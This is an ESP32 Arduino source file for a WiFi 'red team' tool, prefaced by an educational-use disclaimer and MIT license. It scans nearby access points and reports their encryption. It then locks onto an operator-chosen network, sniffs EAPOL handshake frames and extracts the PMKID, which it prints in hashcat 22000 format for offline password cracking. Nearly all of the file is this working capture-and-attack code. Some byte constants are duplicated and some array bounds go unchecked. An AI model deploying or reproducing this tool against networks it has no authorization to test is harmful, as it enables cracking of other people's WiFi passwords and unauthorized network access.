/*
 * Project Name: ESP32 Raw WiFi Pentesting Tool
 * Author:       Enes Berk Yetim
 * Year:         2025
 * Platform:     ESP32 (Espressif Systems)
 * Language:     C / C++ (Arduino Framework with esp_wifi)
 * * Description:
 * This tool is developed to demonstrate low-level 802.11 management frame parsing 
 * and PMKID extraction techniques on ESP32 hardware without relying on high-level 
 * external packet parsing libraries. It implements a custom state machine for 
 * scanning, target locking, and passive packet capture.
 *
 * =================================================================================
 * LEGAL DISCLAIMER
 * =================================================================================
 * * 1. EDUCATIONAL PURPOSE ONLY:
 * This software is provided strictly for educational purposes and for testing 
 * authorized networks (Internal Penetration Testing / Red Teaming).
 * * 2. NO LIABILITY:
 * The author holds no responsibility for any misuse of this software or any 
 * damage that may arise from using it. The user is solely responsible for   
 * complying with all applicable local, state, and federal laws regarding 
 * wireless security auditing.
 * * 3. AUTHORIZATION:
 * Interacting with, capturing traffic from, or attacking wireless networks 
 * without the explicit written consent of the owner is illegal and punishable 
 * by law. Only use this tool on networks you own or have permission to audit.
 * * =================================================================================
 * * License: MIT License
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 */

#include <WiFi.h>
#include "esp_wifi.h"

typedef struct {
  int16_t fctl;
  int16_t duration;
  uint8_t da[6];
  uint8_t sa[6];
  uint8_t bssid[6];
  int16_t seqctl;
} __attribute__((packed)) wifi_header_t;


// These are the defined byte arrays for the akm and cipher suites
uint8_t wpa1_oui[] = { 0x00, 0x50, 0xF2, 0x01 };

uint8_t psk_suite[] = { 0x00, 0x0F, 0xAC, 0x02 };

uint8_t psk_ft_suite[] = { 0x00, 0x0F, 0xAC, 0x04 };

uint8_t psk_sha_suite[] = { 0x00, 0x0F, 0xAC, 0x04 };

uint8_t sae_suite[] = { 0x00, 0x0F, 0xAC, 0x08 };

uint8_t sae_ft_suite[] = { 0x00, 0x0F, 0xAC, 0x09 };

uint8_t wep40_suite[] = { 0x00, 0x0F, 0xAC, 0x01 };

uint8_t wep104_suite[] = { 0x00, 0x0F, 0xAC, 0x05 };

uint8_t aes_suite[] = { 0x00, 0x0F, 0xAC, 0x04 };

uint8_t tkip_suite[] = { 0x00, 0x0F, 0xAC, 0x02 };

// The signature of an EAPOL packet (LLC/SNAP Header: AA AA 03 00 00 00 + EtherType: 88 8E)
const uint8_t EAPOL_SIG[] = { 0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E };

// To hold the unique AP's
uint8_t unique_bssids[60][6] = { 0 };
uint8_t unique_next = 0;

#define MENU_MODE 0
#define SCAN_MODE 1
#define ATTACK_MODE 2
#define QUIT_MODE -1
int current_state = MENU_MODE;

// Defining the target AP structure
typedef struct {
  uint8_t bssid[6];
  uint8_t channel;
  char ssid[33];
} target_t;

// Defining the list of targets
target_t targets[30];
int target_count = 0;
int selected_target_index = -1;

// Printing the PMKID in a suitable hashcat format
void print_pmkid(uint8_t *pmkid, uint8_t *ap_mac, uint8_t *sta_mac) {
  Serial.println("\n\n********** PMKID HAS BEEN CAUGHT ***********");
  Serial.println("----------------- HASHCAT HC2200 FORMAT -----------------");
  
  // Format: WPA*01*PMKID*MAC_AP*MAC_CLIENT*ESSID***MESSAGEPAIR
  
  
  Serial.print("WPA*01*");

  
  for (int i = 0; i < 16; i++) Serial.printf("%02x", pmkid[i]);
  Serial.print("*");

  
  for (int i = 0; i < 6; i++) Serial.printf("%02x", ap_mac[i]);
  Serial.print("*");

  
  for (int i = 0; i < 6; i++) Serial.printf("%02x", sta_mac[i]);
  Serial.print("*");

  // Printing the ESSID in hex format to avoid special characters
  char *ssid_ptr = targets[selected_target_index].ssid;
  while (*ssid_ptr) {
    Serial.printf("%02x", *ssid_ptr);
    ssid_ptr++;
  }

  // PMKID has been caught form the AP so the mask number is 1
  Serial.println("***1");

  Serial.println("---------------------------------------------------------");
}

// All packet capture processes in both scan and attack modes are handled here
void packet_capture(void *buf, wifi_promiscuous_pkt_type_t type) {

  // The data from the monitoring buffer that is actually a packet
  wifi_promiscuous_pkt_t *p = (wifi_promiscuous_pkt_t *)buf;

  // Length of the data, signal strength and the actual data
  int len = p->rx_ctrl.sig_len;
  int rssi = p->rx_ctrl.rssi;
  uint8_t *data = (uint8_t *)p->payload;

  wifi_header_t *wh = (wifi_header_t *)p->payload;


  // Checking the state of the program
  if (current_state == ATTACK_MODE) {
    
    // We should only process packets that is coming from the target AP so we're checking the BSSID or the Source Address (sa) for matches
    if (memcmp(wh->sa, targets[selected_target_index].bssid, 6) != 0 && memcmp(wh->bssid, targets[selected_target_index].bssid, 6) != 0) {
      return;
    }

      // Debug statement to see if we capture "any" packets form the target AP
      //Serial.print("."); 

      // Checking if there is an EAPOL signature in the captured packet
      for (int i = 0; i < len - 8; i++) {
          if (memcmp(&data[i], EAPOL_SIG, 8) == 0) {
              
              Serial.println("\n[+] An EAPOL packet has been captured !");
              
              uint8_t *eapol_packet = &data[i + 8]; 
              
              // Even if it's an EAPOL packet, we need it's key descriptor to be type 3
              // If the key descriptor is 3 that means it's the first or the third packet in EAPOL handshake
              // Which probably can contain the PMKID
              
              if (eapol_packet[1] != 3) continue; 

              // Storing the key data length
              uint16_t key_data_len = (eapol_packet[97] << 8) | eapol_packet[98];
              //Serial.printf("    Key Data Len: %d byte\n", key_data_len);

              // Check if there's a key data part in the EAPOL packet
              if (key_data_len > 0) {
                  uint8_t *key_data = &eapol_packet[99];
                  int k_offset = 0;
                  bool rsn_found = false;
                  
                  // Traversing the tags in the key data and check if RSN tag is there
                  while (k_offset < key_data_len) {
                      uint8_t tag_id = key_data[k_offset];
                      uint8_t tag_len = key_data[k_offset + 1];
                      
                      // Check if the tag value is 48, which indicates it's a RSN tag which may have the PMKID we've been looking for
                      if (tag_id == 48) { 
                          rsn_found = true;
                          Serial.println("    RSN  has been found. Now looking for PMKID...");
                          
                          // We need to obtain pairwise cipher count to skip this values and find the akm data offset
                          // We will also have to obtain the akm suite count to skip the akm suite parts that we don't need
                          // PMKID is inside the caps section that comes after de pairwise cipher and akm suites sections
                          uint8_t *rsn_base = &key_data[k_offset + 2];
                          uint16_t pw_count = rsn_base[6] | (rsn_base[7] << 8);
                          int akm_offset = 8 + (pw_count * 4);
                          uint16_t akm_count = rsn_base[akm_offset] | (rsn_base[akm_offset+1] << 8);
                          int caps_offset = akm_offset + 2 + (akm_count * 4);
                          // Starting point of the PMKID value
                          int pmkid_count_offset = caps_offset + 2; 
                          
                          // Checking if the PMKID value is available
                          if (tag_len > pmkid_count_offset) {
                              uint8_t *pmkid_data = &rsn_base[pmkid_count_offset + 2];
                              print_pmkid(pmkid_data, wh->bssid, wh->da); // Printing the PMKID as we found it
                              return; // We have found the PMKID, so there's nothing more to do
                          } else {
                              Serial.println("    [-] There is no PMKID in this EAPOL packet");
                          }
                      }
                      k_offset += 2 + tag_len; // Skipping to the next tag value as current one is not RSN
                  }
                  //if (!rsn_found) Serial.println("    [-] RSN tag couldn't been found in Key Data");
              } else {
                  //Serial.println("    [-] Key Data is empty");

              }
          }
      }
      return;
  }

  // Checking the state of the program and returning if it's neither attack or scan mode
  if (current_state != SCAN_MODE) {
    return;
  }

  // Defining the variables that will hold the channel and SSID values reside in the captured packet that corresponds to an AP
  uint8_t channel = 0; 
  char ssid[33] = { 0 };

  // Not all the captured packets are meaningful
  // We need the management type frames which means that they hold no data and they are being used in connection, disconnection and broadcasting an AP's info
  // Under management type frames, we need beacon subtype frames that AP's send in short intervals to say "Hey, I'm here" 
  uint8_t frame_type = (wh->fctl & 0x000C) >> 2;
  uint8_t frame_subtype = (wh->fctl & 0x00F0) >> 4;

  // Checking the type and subtype
  if (frame_type == 0 && frame_subtype == 8) {
    uint8_t *data = (uint8_t *)p->payload;

  // We need to traverse the tags to obtain different informations about the AP
    int offset = 36;
    int unique_check = 1;
    int wpa1 = 0;


    while (offset < len) {
      uint8_t tag_id = data[offset];
      uint8_t tag_len = data[offset + 1];

      uint8_t temp = 0;

      // If the tag is 0 that means it has the SSID string that we usually see when connecting to an AP
      if (tag_id == 0) {

        // Checking if the captured packet corresponds to an unique AP and storing it's information (BSSID)
        for (int i = 0; i < 60; i++) {
          if (memcmp(unique_bssids[i], wh->bssid, 6) == 0) {
            unique_check = 0;
            break;
          }
        }
        if (unique_check) {
          memcpy(unique_bssids[unique_next], wh->bssid, 6);
          unique_next++;

          // Printing the MAC address of the unique AP
          Serial.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X | ",
                        wh->bssid[0], wh->bssid[1], wh->bssid[2],
                        wh->bssid[3], wh->bssid[4], wh->bssid[5]);



          // If the length of the SSID string is 0, that means it's a hidden AP
          if (tag_len == 0) {
            Serial.printf("SSID: %30s", "<HIDDEN>");
          } else {
            

            for (int i = 0; i < tag_len; i++) {
              ssid[i] = (char)data[offset + 2 + i];
            }

            Serial.printf("SSID: %30s", ssid);
          }
        }
        break;
      }




      offset += 2 + tag_len; // Continuing on the next tags
    }

    // Now we traverse the tags again and obtain the channel that the AP is broadcasting
    offset = 36;
    if (unique_check) {
      while (offset < len) {
        uint8_t tag_id = data[offset];
        uint8_t tag_len = data[offset + 1];

        // Channel info is in tag 3
        if (tag_id == 3) {
          uint8_t ch_len = data[offset + 1];
          channel = (uint8_t)data[offset + 2];
          Serial.printf(" | CHANNEL: %3d", channel);
          break;
        }
        offset += 2 + tag_len;
      }
    }

    // Then we will try to obtain information on the key management and encryption mechanisms of the AP which is a critical information
    offset = 36;
    if (unique_check) {


      while (offset < len) {
        uint8_t tag_id = data[offset];
        uint8_t tag_len = data[offset + 1];

        // If the AP is using WPA1 then it's information is stored in the tag 221, otherwise (WPA2/3) it's in tag 48
        if (tag_id == 48 || tag_id == 221) {
          if (tag_id == 48) {
            // Obtaining the starting point and the length of the RSN data section
            uint8_t rsn_len = data[offset + 1];
            uint8_t *rsn_data_start = &data[offset + 2];

            // The AP can use more than one pairwise ciphers like (AES + TKIP) we need to know that also
            // Because the starting point of the akm suite data changes according to this information
            uint8_t pairwise_cipher_count = rsn_data_start[6] | (rsn_data_start[7] << 8);


            uint8_t *akm_suite = rsn_data_start + 10 + (pairwise_cipher_count * 4);

            uint8_t *cipher_suite = rsn_data_start + 8;

            // Comparing the AKM suite value of the AP's becaon frame to the known patterns
            if (memcmp(akm_suite, psk_suite, 4) == 0) {

              Serial.printf(" | %30s", "WPA2-PSK ");

            } else if (memcmp(akm_suite, psk_ft_suite, 4) == 0) {
              Serial.printf(" | %30s", "WPA2-PSK (FT Auth & FT Key Mgmt) ");

            } else if (memcmp(akm_suite, psk_sha_suite, 4) == 0) {
              Serial.printf(" | %30s", "WPA2-PSK (SHA256 Deriv & RSNA Key Mgmt) ");

            } else if (memcmp(akm_suite, sae_suite, 4) == 0) {
              Serial.printf(" | %30s", "WPA3-SAE (SHA256 Deriv & RSNA Key Mgmt)");
            } else if (memcmp(akm_suite, sae_ft_suite, 4) == 0) {
              Serial.printf(" | %30s", "WPA3-SAE (FT Auth & FT Key Mgmt) ");
            } else {

              Serial.printf(" | %02X:%02X:%02X:%02X", akm_suite[0], akm_suite[1], akm_suite[2], akm_suite[3]);
            }

            // If the AP is using more than one pairwise cipher suite we need to print them both
            if (pairwise_cipher_count > 1) {
              if (memcmp(cipher_suite, aes_suite, 4) == 0) {

                Serial.printf("%-7s", "(AES + ");
              } else if (memcmp(cipher_suite, tkip_suite, 4) == 0) {

                Serial.printf("%-8s", "(TKIP + ");
              } else if (memcmp(cipher_suite, wep40_suite, 4) == 0) {

                Serial.printf("%-8s", "(WEP40 + ");
              } else if (memcmp(cipher_suite, wep104_suite, 4) == 0) {

                Serial.printf("%-8s", "(WEP104 + ");
              }

              uint8_t *cipher_suite2 = cipher_suite + 4;

              if (memcmp(cipher_suite2, aes_suite, 4) == 0) {

                Serial.printf("%-7s", " AES)");
              } else if (memcmp(cipher_suite2, tkip_suite, 4) == 0) {

                Serial.printf("%-8s", " TKIP) ");
              } else if (memcmp(cipher_suite2, wep40_suite, 4) == 0) {

                Serial.printf("%-7s", " WEP40) ");
              } else if (memcmp(cipher_suite2, wep104_suite, 4) == 0) {

                Serial.printf("%-7s", " WEP104)");
              }

            } else {
              if (memcmp(cipher_suite, aes_suite, 4) == 0) {

                Serial.printf("%-15s", "(AES) ");
              } else if (memcmp(cipher_suite, tkip_suite, 4) == 0) {

                Serial.printf("%-15s", "(TKIP) ");
              } else if (memcmp(cipher_suite, wep40_suite, 4) == 0) {

                Serial.printf("%-15s", "(WEP40) ");
              } else if (memcmp(cipher_suite, wep104_suite, 4) == 0) {

                Serial.printf("%-15s", "(WEP104) ");
              }
            }



            // Printing the signal strength
            Serial.printf(" | RSSI: %d\n", p->rx_ctrl.rssi);
            break;
          } else if (tag_id == 221) {
            wpa1 = 1;
          } else {
            continue;
          }
        }
        offset += 2 + tag_len;
      }

      if ((memcmp(&data[offset + 2], wpa1_oui, 4) == 0) && wpa1) {
        Serial.printf(" | %30s", "WPA ");
        Serial.printf("%-7s", "(TKIP) ");
        Serial.printf(" | RSSI: %d\n", p->rx_ctrl.rssi);
      }

      // Adding the unique AP to the target list that will be used for attack mode
      if (target_count < 30) {
          memcpy(targets[target_count].bssid, wh->bssid, 6);
          targets[target_count].channel = channel;
          strcpy(targets[target_count].ssid, ssid);
          target_count++;
      }
    }
  }

  
}

void setup() {
  Serial.begin(9600);
  esp_log_level_set("*", ESP_LOG_NONE);

  wifi_init_config_t wifi_config = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&wifi_config);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_set_mode(WIFI_MODE_NULL);
  esp_wifi_start();

  esp_wifi_set_promiscuous(true);
  const wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous_filter(&filter);


  esp_wifi_set_promiscuous_rx_cb(&packet_capture);
}



void loop() {


  if (current_state == MENU_MODE) {
    Serial.println("\n===========================");
    Serial.println("   ESP32 RED TEAM CONSOLE  ");
    Serial.println("===========================");
    Serial.println("1. Wi-Fi Scan & Analyze");
    Serial.println("2. PMKID Attack (Scan First)");
    Serial.print("Please select: ");


    while (!Serial.available()) { delay(10); }

    int choice = Serial.parseInt();

    while (Serial.available()) Serial.read(); 

    if (choice == 1) {
      Serial.println("\n[+] Starting to scan... (Press 'x' to quit)");


      unique_next = 0;
      memset(unique_bssids, 0, sizeof(unique_bssids));

      current_state = SCAN_MODE;
    } else if (choice == 2) {
      Serial.println("\n[!] You should first run scan to select a target");
      ;  // Şimdilik boş
    } else {
      Serial.println("\n[!] False selection !");
    }
  }


  else if (current_state == SCAN_MODE) {

    uint8_t new_channel = random(1, 14);
    esp_wifi_set_channel(new_channel, WIFI_SECOND_CHAN_NONE);
    delay(500);

    if (Serial.available()) {
      char key = Serial.read();
      while (Serial.available()) Serial.read(); 

      if (key == 'x') {
        Serial.println("\n[-] Scan is completed. Select a target to listen:");
        for (int i = 0; i < target_count; i++) {
          Serial.printf("[%d] %s (CH: %d)\n", i, targets[i].ssid, targets[i].channel);
        }

        Serial.print("\nID of the target to be listened: ");
        while (!Serial.available()) delay(10);
        int target_id = Serial.parseInt();
        while (Serial.available()) Serial.read(); // FLUSH BUFFER

        if (target_id >= 0 && target_id < target_count) {
          selected_target_index = target_id;

          Serial.printf("\n[+] Engaged in target: %s\n", targets[target_id].ssid);
          Serial.printf("[+] Locking the channel to %d...\n", targets[target_id].channel);

          esp_wifi_set_channel(targets[target_id].channel, WIFI_SECOND_CHAN_NONE);

          // Changing the filter to capture the data packets which the PMKID reside
          wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
          esp_wifi_set_promiscuous_filter(&filter);

          current_state = ATTACK_MODE;
          Serial.println("[*] Attack mode is active. Waiting for EAPOL packets...");
        } else {
          current_state = MENU_MODE;
        }
      }
    }
  }


  else if (current_state == ATTACK_MODE) {
    
    if (Serial.available()) {
      char key = Serial.read();
      while (Serial.available()) Serial.read(); 
      if (key == 'x') {
        Serial.println("\n[-] Attack has been stoped. Flushing the target list...");
        
        current_state = MENU_MODE;
        
        // Changing the filter back to management frames to be able to run the scan mode
        wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
        esp_wifi_set_promiscuous_filter(&filter);
        
        // Flushing the target list
        target_count = 0;
        selected_target_index = -1;
        memset(targets, 0, sizeof(targets));
        // Flushing the unique AP's list
        memset(unique_bssids, 0, sizeof(unique_bssids));
        unique_next = 0;
      }
    }
    delay(100);
  }
}